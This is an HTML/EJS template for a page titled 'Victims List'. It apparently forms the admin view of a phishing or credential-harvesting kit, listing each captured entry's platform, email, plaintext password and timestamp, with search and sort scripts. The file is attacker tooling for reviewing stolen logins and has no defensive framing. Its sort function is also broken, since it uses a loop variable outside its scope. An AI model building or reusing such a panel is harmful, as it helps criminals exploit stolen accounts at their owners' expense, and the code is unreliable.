
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Victims List</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/victims/css/main.css">
</head>

<body>
    <div class="container">
        <div class="search-box">
            <input type="text" id="search" placeholder="Search by platform, email, or password">
        </div>
        <table class="table table-striped table-bordered">
            <thead>
                <tr>
                    <th>SN</th>
                    <th onclick="sortTable(1)">Platform</th>
                    <th onclick="sortTable(2)">Email</th>
                    <th onclick="sortTable(3)">Password</th>
                    <th onclick="sortTable(4)">Timestamp</th>
                </tr>
            </thead>
            <tbody id="victimsTable">
                <% db.forEach((entry, index) => { %>
                <tr>
                    <td><%= index + 1 %></td>
                    <td><%= entry.platform %></td>
                    <td><%= entry.email %></td>
                    <td><%= entry.password %></td>
                    <td><%= new Date(entry.timestamp).toLocaleString() %></td>
                </tr>
                <% }) %>
            </tbody>
        </table>
    </div>

    <script>
        // Sorting function
        function sortTable(n) {
            const table = document.querySelector("table");
            let switching = true;
            let shouldSwitch;
            let dir = "asc";
            let switchCount = 0;
            while (switching) {
                switching = false;
                const rows = table.rows;
                for (let i = 1; i < (rows.length - 1); i++) {
                    shouldSwitch = false;
                    const x = rows[i].getElementsByTagName("TD")[n];
                    const y = rows[i + 1].getElementsByTagName("TD")[n];
                    if (dir === "asc") {
                        if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
                            shouldSwitch = true;
                            break;
                        }
                    } else if (dir === "desc") {
                        if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
                            shouldSwitch = true;
                            break;
                        }
                    }
                }
                if (shouldSwitch) {
                    rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
                    switching = true;
                    switchCount++;
                } else {
                    if (switchCount === 0 && dir === "asc") {
                        dir = "desc";
                        switching = true;
                    }
                }
            }
        }

        // Search functionality
        document.getElementById('search').addEventListener('input', function () {
            const query = this.value.toLowerCase();
            const rows = document.querySelectorAll("#victimsTable tr");
            rows.forEach(row => {
                const cells = row.getElementsByTagName('td');
                let match = false;
                for (let i = 1; i < cells.length; i++) {
                    if (cells[i].textContent.toLowerCase().includes(query)) {
                        match = true;
                        break;
                    }
                }
                row.style.display = match ? '' : 'none';
            });
        });
    </script>
</body>

</html>
